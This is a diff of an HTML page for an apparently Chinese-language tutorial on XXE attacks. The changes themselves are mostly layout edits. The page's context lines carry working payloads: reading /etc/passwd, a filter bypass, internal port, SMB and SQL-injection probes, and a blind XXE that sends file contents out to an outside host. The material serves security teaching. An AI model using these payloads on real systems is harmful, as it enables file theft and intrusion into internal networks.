@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2017-12-09</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -116,15 +117,12 @@
 
 <h3 id="0x00-xxe">0x00 XXE</h3>
 
-<blockquote>
 <p>XXE漏洞是针对使用XML交互的Web应用程序的攻击方法</p>
 
 <p>XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛</p>
-</blockquote>
 
 <h3 id="0x01-xml格式">0x01 XML格式</h3>
 
-<blockquote>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  &lt;!--xml声明--&gt;
 
 &lt;!--文档类型定义--&gt;
@@ -144,18 +142,15 @@
 &lt;body&gt;Hi,I’am John&lt;/body&gt;
 &lt;/note&gt;
 </code></pre>
-</blockquote>
 
 <h3 id="0x02-内部声明与外部引用">0x02 内部声明与外部引用</h3>
 
-<blockquote>
 <pre><code class="language-xml">&lt;!--内部声明实体--&gt;
 &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
 
 &lt;!--引用外部实体--&gt;
 &lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
 </code></pre>
-</blockquote>
 
 <h3 id="0x03-xxe漏洞">0x03 XXE漏洞</h3>
 
@@ -163,7 +158,6 @@
 <li>外部引用时可能会出现漏洞，几种payload：</li>
 </ul>
 
-<blockquote>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE a [
   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;
@@ -187,13 +181,11 @@ evil.dtd中的内容为：&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot; &g
 
 evil.dtd中的内容为：&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot; &gt;
 </code></pre>
-</blockquote>
 
 <ul>
 <li>简单绕过</li>
 </ul>
 
-<blockquote>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE xdsec [
   &lt;!ELEMENT methodname ANY &gt;
@@ -203,24 +195,20 @@ evil.dtd中的内容为：&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot; &g
   &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
 &lt;/methodcall&gt;
 </code></pre>
-</blockquote>
 
 <ul>
 <li>扫描内网</li>
 </ul>
 
-<blockquote>
 <pre><code class="language-xml">&lt;!ENTITY portscan SYSTEM 'http://192.168.2.22:6379/'&gt;
 &lt;!ENTITY smb SYSTEM '\\192.168.2.22\C$'&gt;
 &lt;!ENTITY sqli SYSTEM 'http://192.168.2.22/a.php?id=-1+union+select+1,2,3--'&gt;
 </code></pre>
-</blockquote>
 
 <ul>
 <li>Blind-XXE</li>
 </ul>
 
-<blockquote>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE root [
     &lt;!ENTITY % ttt SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;
@@ -246,10 +234,10 @@ evil.dtd中的内容为：&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot; &g
 &lt;!--evil.xml内容：--&gt;
 &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM 'http://192.168.150.1/1.php?file=%file;'&gt;&quot;&gt;
 </code></pre>
-</blockquote>
 
-<p><br>
-Reference(侵删)：</p>
+<p><br></p>
+
+<h4 id="reference-侵删">Reference(侵删)：</h4>
 
 <ul>
 <li><a href="http://blog.csdn.net/u011721501/article/details/43775691">http://blog.csdn.net/u011721501/article/details/43775691</a></li>
